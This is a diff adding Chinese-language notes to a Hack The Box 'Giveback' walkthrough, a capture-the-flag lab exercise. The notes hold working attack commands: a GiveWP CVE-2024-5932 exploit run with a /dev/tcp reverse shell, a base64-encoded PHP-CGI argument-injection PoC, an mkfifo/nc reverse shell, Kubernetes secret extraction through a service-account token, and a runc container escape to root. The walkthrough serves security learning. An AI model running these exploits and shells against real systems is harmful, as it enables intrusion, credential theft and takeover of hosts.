@@ -1,4 +1,311 @@
 ## Giveback [0xdf]
+
+<details>
+<summary>总结</summary>
+
+```
+————————————————————————————————————————————————————————————————
+需要注册https://wpscan.com/register/拿个token ，扫描漏洞的
+[★]$ sudo wpscan --url http://giveback.htb -e ap,u --api-token cDAs***************************************
+————————————————————————————————————————————————————————————————
+[★]$ curl -I http://10.129.242.171:30686
+HTTP/1.1 200 OK
+Content-Type: application/json
+X-Content-Type-Options: nosniff
+X-Load-Balancing-Endpoint-Weight: 1
+Date: Wed, 25 Mar 2026 08:06:46 GMT
+Content-Length: 127
+
+X-Load-Balancing-Endpoint-Weight是Google Cloud External Network Load Balancing使用的自定义 HTTP 响应标头，但 Cilium（一个 K8s 网络插件）也使用它。
+
+综上所述，这似乎是一个 Kubernetes 服务代理，它基于以下原理暴露了一个名为“wp-nginx-service”的服务：
+
+JSON 响应本身包含 Kubernetes 特有的字段：
+“namespace”: “default”  - Kubernetes 将资源组织到命名空间中
+带有名称和命名空间的“service”——这是 Kubernetes 服务识别的方式。
+“localEndpoints”/“serviceProxyHealthy”——这些是Cilium健康代理术语。
+端口 30686 属于 Kubernetes NodePort 范围 (30000-32767)，这是 K8s 用于向外部暴露服务的默认范围。
+标题 X-Load-Balanced-Endpoint-Weight 是 Cilium 的特征。
+服务名称 wp-nginx-service 遵循 Kubernetes 命名约定。
+————————————————————————————————————————————————————————————————
+[★]$ git clone https://github.com/EQSTLab/CVE-2024-5932.git
+[★]$ cd CVE-2024-5932
+[~/CVE-2024-5932][★]$ ls
+CVE-2024-5932.py  CVE-2024-5932-rce.py  PoC.php  README.md  requirements.txt
+[~/CVE-2024-5932][★]$ pip install -r requirements.txt
+[~/CVE-2024-5932][★]$ python3 CVE-2024-5932-rce.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.15.139/443 0>&1"'
+
+[★]$ sudo nc -lvnp 443
+<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$ ^Z
+[1]+  Stopped                 sudo nc -lvnp 443
+┌─[us-dedivip-4]─[10.10.15.139]─[syareya55@htb-nd098h0v5r]─[~/CVE-2024-5932]
+└──╼ [★]$ stty raw -echo; fg
+sudo nc -lvnp 443
+                 reset
+bash: reset: command not found
+<-59ffb97c44-pjh4n:/opt/bitnami/wordpress/wp-admin$
+————————————————————————————————————————————————————————————————
+主机名符合 K8s 的默认命名模式<deployment>-<replicaset-hash>-<pod-hash>，因此部署名称为“beta-vino-wp-wordpress”，副本集哈希值为“59ffb97c44”，pod 唯一哈希值为“pjh4n”
+初始目录与/opt/bitnami/wordpress/Bitnami Helm chart WordPress 布局相匹配，这是在 Kubernetes 上部署 WordPress 的标准方法
+https://www.fobwp.com/kubernetes-wordpress-guide/
+————————————————————————————————————————————————————————————————
+文件/etc/hosts还显示它由 Kubernetes 管理：
+
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/$ cat /etc/hosts
+Kubernetes-managed hosts file.
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+fe00::0	ip6-mcastprefix
+fe00::1	ip6-allnodes
+fe00::2	ip6-allrouters
+10.42.1.249	beta-vino-wp-wordpress-59ffb97c44-pjh4n
+
+# Entries added by HostAliases.
+127.0.0.1	status.localhost
+————————————————————————————————————————————————————————————————
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ ls
+mariadb-password  mariadb-root-password  wordpress-password
+
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat mariadb-password       sW5sp4spa3u7RLyetrekE4oS
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat mariadb-root-password   sW5sp4syetre32828383kE4oS
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ cat wordpress-password      O8F7KR5zGi
+————————————————————————————————————————————————————————————————
+I have no name!@beta-vino-wp-wordpress-59ffb97c44-pjh4n:/secrets$ env
+KUBERNETES_SERVICE_PORT_HTTPS=443
+WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80  <--
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000  <--	//php -r "echo file_get_contents('http://10.43.2.241:5000/');"
+WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80  <--
+BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80  <--
+BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306  <--
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1  <--
+————————————————————————————————————————————————————————————————
+wp-config.php包含数据库连接信息：
+<-wordpress-fb7b8dcf8-kzt98:/opt/bitnami/wordpress$ cat wp-config.php
+<?php
+...[SNIP]...
+define( 'DB_NAME', 'bitnami_wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'bn_wordpress' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );
+
+/** Database hostname */
+define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
+————————————————————————————————————————————————————————————————
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5sp4spa3u7RLyetrekE4oS' bitnami_wordpress
+————————————————————————————————————————————————————————————————
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$  php -r "echo file_get_contents('http://10.43.2.241:5000/');"
+
+  <!-- Developer note: phpinfo accessible via debug mode during migration window -->	//开头
+
+    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.		//页尾
+    During migration to Linux, the Windows-style CGI handling was retained to ensure
+    legacy scripts continued to function without modification.</p>
+————————————————————————————————————————————————————————————————
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$  php -r "echo file_get_contents('http://10.43.2.241:5000/phpinfo.php?dubug');"	//加上?debug就打开了
+[★]$ vi debug.html
+[★]$ firefox debug.html
+
+这台服务器运行的是 CGI 程序。此页面显示的 PHP CGI 版本为 8.3.3
+CVE-2024-4577
+https://nvd.nist.gov/vuln/detail/cve-2024-4577
+————————————————————————————————————————————————————————————————
+https://nvd.nist.gov/vuln/detail/cve-2012-1823
+在 PHP 5.3.12 之前的版本和 5.4.x 版本（5.4.2 之前的版本）中，sapi/cgi/cgi_main.c 在配置为 CGI 脚本（又名 php-cgi）时，无法正确处理缺少 =（等号）字符的查询字符串，这使得远程攻击者可以通过在查询字符串中放置命令行选项来执行任意代码，这与未跳过 'd' 情况下的某些 php_getopt 有关
+
+https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv
+如果攻击者将-`to`改为 ` %ad，则会绕过补丁并注入代码-s以显示 PHP 源代码…… -->	http://server/index.php?%ads
+————————————————————————————————————————————————————————————————
+POC 概念验证
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php -r "echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi');"                     
+OK
+
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ echo PD9waHAKJGNtZCA9ICRhcmd2WzFdID8/ICJpZCI7CiR1cmwgPSAiaHR0cDovLzEwLjQzLjIuMjQxOjUwMDAvY2dpLWJpbi9waHAtY2dpPyVBRGQrYXV0b19wcmVwZW5kX2ZpbGUlM0RwaHAlM0ElMkYlMkZpbnB1dCI7CiRjdHggPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoWyJodHRwIiA9PiBbCiAgICAibWV0aG9kIiA9PiAiUE9TVCIsCiAgICAiaGVhZGVyIiA9PiAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgImNvbnRlbnQiID0+ICRjbWQKXV0pOwokciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIGZhbHNlLCAkY3R4KTsKZWNobyAkcjsKPz4K | base64 -d > /tmp/rce.php
+
+<?php
+$cmd = $argv[1] ?? "id";
+$url = "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput";
+$ctx = stream_context_create(["http" => [
+    "method" => "POST",
+    "header" => "Content-Type: application/x-www-form-urlencoded",
+    "content" => $cmd
+]]);
+$r = file_get_contents($url, false, $ctx);
+echo $r;
+?>
+
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php
+[START]uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+[END]
+
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'which bash'      
+[START][END]
+
+I have no name!@beta-vino-wp-wordpress-fb7b8dcf8-kzt98:/$ php /tmp/rce.php 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.139 443 >/tmp/f'
+————————————————————————————————————————————————————————————————
+[★]$ sudo nc -lvnp 443
+
+/var/www/html/cgi-bin # script /dev/null -c sh
+Script started, output log file is '/dev/null'.
+/var/www/html/cgi-bin # ^[[22;25R^Z
+[1]+  Stopped                 sudo nc -lvnp 443
+┌─[us-dedivip-4]─[10.10.15.139]─[syareya55@htb-uwxrnx80zh]─[~]
+└──╼ [★]$ stty raw -echo;fg
+sudo nc -lvnp 443
+                 reset
+/var/www/html/cgi-bin #
+————————————————————————————————————————————————————————————————
+/var/www/html/cgi-bin # hostname
+legacy-intranet-cms-6f7bf5db84-gb975
+————————————————————————————————————————————————————————————————
+/var/run/secrets/kubernetes.io/serviceaccount # ls
+ca.crt     namespace  token
+
+/ # cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 
+default/
+
+token- 用于对 K8s API 进行身份验证的 JWT | ca.crt- 集群 CA 证书 | namespace- pod 的命名空间
+可以用这些文件与 Kubernetes API 进行交互。文件系统的其余部分都是空的
+————————————————————————————————————————————————————————————————
+K8s API | Authentication验证
+HackTricks网站上有一个页面展示了如何使用这些值来curl访问API：
+https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html#using-curl
+
+/ # export APISERVER=10.43.0.1:443
+/ # export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+/ # export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+/ # export TOKEN=$(cat ${SERVICEACCOUNT}/token)
+/ # export CACERT=${SERVICEACCOUNT}/ca.crt
+/ # alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
+————————————————————————————————————————————————————————————————
+/ # curl https://$APISERVER/api -k
+/ # kurl https://$APISERVER/api
+ "versions": [
+    "v1"
+
+/ # kurl https://$APISERVER/api/v1/namespaces/$NS/pods
+"message": "pods is forbidden: User \"system:serviceaccount:default:secret-reader-sa\" cannot list resource \"pods\" in API group \"\" at the cluster scope",
+
+/ # kurl https://$APISERVER/api/v1/namespaces/default/secrets
+/ # kurl https://$APISERVER/api/v1/namespaces/default/secrets -s | jq '.items[] | {name:.metadata.name, keys: (.data | keys)}' -c	//信息没用
+————————————————————————————————————————————————————————————————
+/var/www/html/cgi-bin # kurl https://$APISERVER/api/v1/namespaces/default/secrets -s | jq '.items[] | select(.metadata.name | startswith("sh.helm") | not) | {name: .metadata.name, data: (.data | map_values(@base64d))}' -c
+{"name":"beta-vino-wp-mariadb","data":{"mariadb-password":"sW5sp4spa3u7RLyetrekE4oS","mariadb-root-password":"sW5sp4syetre32828383kE4oS"}}
+{"name":"beta-vino-wp-wordpress","data":{"wordpress-password":"O8F7KR5zGi"}}
+{"name":"user-secret-babywyrm","data":{"MASTERPASS":"jrTEyZxVvBwHdliXbzsv8EciYowB3llY"}}
+
+default 命名空间里的所有 secret（机密）
+jq 过滤逻辑
+.items[]	 //遍历所有 secrets
+select(.metadata.name | startswith("sh.helm") | not)	//过滤掉 Helm 生成的垃圾数据
+{ name: .metadata.name, data: (...) }	//只保留：secret 名	、解码后的数据
+.data | map_values(@base64d)	//Kubernetes 的 secret 默认是：base64 编码 -> 这个操作是： 全部解码成明文
+————————————————————————————————————————————————————————————————
+[★]$ netexec ssh giveback.htb -u babywyrm -p jrTEyZxVvBwHdliXbzsv8EciYowB3llY
+[*] Copying default configuration file
+SSH         10.129.242.171  22     giveback.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
+SSH         10.129.242.171  22     giveback.htb     [+] babywyrm:jrTEyZxVvBwHdliXbzsv8EciYowB3llY  Linux - Shell access!
+
+[★]$ ssh babywyrm@giveback.htb
+babywyrm@giveback:~$
+————————————————————————————————————————————————————————————————
+babywyrm@giveback:~$ sudo -l 
+Matching Defaults entries for babywyrm on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty, timestamp_timeout=0, timestamp_timeout=20
+
+User babywyrm may run the following commands on localhost:
+    (ALL) NOPASSWD: !ALL
+    (ALL) /opt/debug
+
+babywyrm@giveback:~$ sudo /opt/debug
+[sudo] password for babywyrm: jrTEyZxVvBwHdliXbzsv8EciYowB3llY
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: sW5sp4spa3u7RLyetrekE4oS
+
+[*] Administrative password verified
+Error: No command specified. Use '/opt/debug --help' for usage information.
+babywyrm@giveback:~$ 
+
+babywyrm@giveback:~$ sudo /opt/debug --help
+babywyrm@giveback:~$ sudo /opt/debug --version
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: --version
+runc version 1.1.11
+commit: v1.1.11-0-g4bccb38c
+spec: 1.0.2-dev
+go: go1.20.12
+libseccomp: 2.5.4
+————————————————————————————————————————————————————————————————
+//runc可以创建容器,为容器设置根文件系统
+babywyrm@giveback:~$ mkdir -p /tmp/runc/rootfs
+babywyrm@giveback:~$ cd /tmp/runc
+
+babywyrm@giveback:/tmp/runc$ cp -aL /bin rootfs/bin
+
+babywyrm@giveback:/tmp/runc$ mkdir rootfs/lib64
+babywyrm@giveback:/tmp/runc$ cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/
+
+babywyrm@giveback:/tmp/runc$ mkdir rootfs/lib
+babywyrm@giveback:/tmp/runc$ cp -a /lib/x86_64-linux-gnu rootfs/lib
+————————————————————————————————————————————————————————————————
+babywyrm@giveback:/tmp/runc$ runc spec //生成一个 OCI 容器运行配置模板
+babywyrm@giveback:/tmp/runc$ ls -l
+total 8
+-rw-rw-r-- 1 babywyrm babywyrm 2500 Mar 26 07:37 config.json //← 容器配置文件（核心！）
+drwxrwxr-x 5 babywyrm babywyrm 4096 Mar 26 07:31 rootfs      //← 容器的根文件系统
+
+babywyrm@giveback:/tmp/runc$ cat config.json
+
+..[SNIP]...
+	"mounts": [
+		{
+			"destination": "/hostfs",           //在容器里，把它放到 /hostfs
+			"type": "bind",           //bind mount（绑定挂载），不是复制，是“直接映射”
+			"source": "/var/..",           //挂载 宿主机的根目录 '/var/..'	==	'/'
+			"options": ["rbind", "rw"]           //rbind →递归挂载（子目录也带上），rw → 可读可写
+		},
+		{
+			"destination": "/proc",
+			"type": "proc",
+			"source": "proc"
+		},
+		{
+			"destination": "/dev",
+...[/SNIP]...
+————————————————————————————————————————————————————————————————
+babywyrm@giveback:/tmp/runc$ ls rootfs/
+bin  dev  hostfs  lib  lib64  proc  sys
+————————————————————————————————————————————————————————————————
+babywyrm@giveback:/tmp/runc$ sudo /opt/debug run syareyaroot
+# ls
+bin  dev  hostfs  lib  lib64  proc  sys
+# cd /hostfs/    
+# ls
+bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   srv  tmp  var
+boot  dev    home  lib32  libx32  media       opt  root  sbin  sys  usr
+————————————————————————————————————————————————————————————————
+# chmod 6777 /hostfs/bin/bash
+# bash -p 
+bash-5.1# id
+uid=0 gid=0 groups=0
+————————————————————————————————————————————————————————————————
+```
+
+</details>
+
 <details>
 <summary>Nmap</summary>
 
@@ -508,7 +815,7 @@ listening on [any] 443 ...
 
 ```
 ```
-[★]$ python3 CVE-2024-5932-rce.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.15.139/443 0>&1"'
+[~/CVE-2024-5932][★]$ python3 CVE-2024-5932-rce.py --url http://giveback.htb/donations/the-things-we-need/ --cmd 'bash -c "bash -i >& /dev/tcp/10.10.15.139/443 0>&1"'
 <SNIP>
 [\] Exploit loading, please wait...
 [+] Requested Data: 
@@ -828,7 +1135,7 @@ MariaDB [bitnami_wordpress]> select * from wp_users;
 1 row in set (0.000 sec)
 ```
 ### Legacy Service 传统服务
-#### 10.43.2.241:5000 上运行着一个旧版服务，根据端口号来看，它很可能是一个 Web 应用程序。我没有安装任何curl工具wget，但php已经安装了，而且我可以轻松地使用file_get_contents它来发出 Web 请求（为了便于阅读，我将使用 `--prod` 来缩短提示符PS1="$ "）：
+#### 10.43.2.241:5000 上运行着一个旧版服务，根据端口号来看，它很可能是一个 Web 应用程序。我没有安装任何curl工具wget，但php已经安装了，而且我可以轻松地使用file_get_contents它来发出 Web 请求
 <details>
 <summary>php -r "echo file_get_contents('http://10.43.2.241:5000/');"</summary>
 
@@ -1996,8 +2303,6 @@ nginx           nginx.pid       php-cgi.socket  secrets
 /var/run # cd secrets
 /var/run/secrets # ls
 kubernetes.io
-/var/run/secrets # cd Kubernetes.io
-sh: cd: can't cd to Kubernetes.io: No such file or directory
 /var/run/secrets # cd kubernetes.io
 /var/run/secrets/kubernetes.io # ls
 serviceaccount
@@ -2296,8 +2601,6 @@ User babywyrm may run the following commands on localhost:
 #### 输入了2遍不同的密码，分别是jrTEyZxVvBwHdliXbzsv8EciYowB3llY 、sW5sp4spa3u7RLyetrekE4oS
 ```
 babywyrm@giveback:~$ sudo /opt/debug
-[sudo] password for babywyrm: 
-Sorry, try again.
 [sudo] password for babywyrm: 
 [*] Validating sudo privileges...
 [*] Sudo validation successful
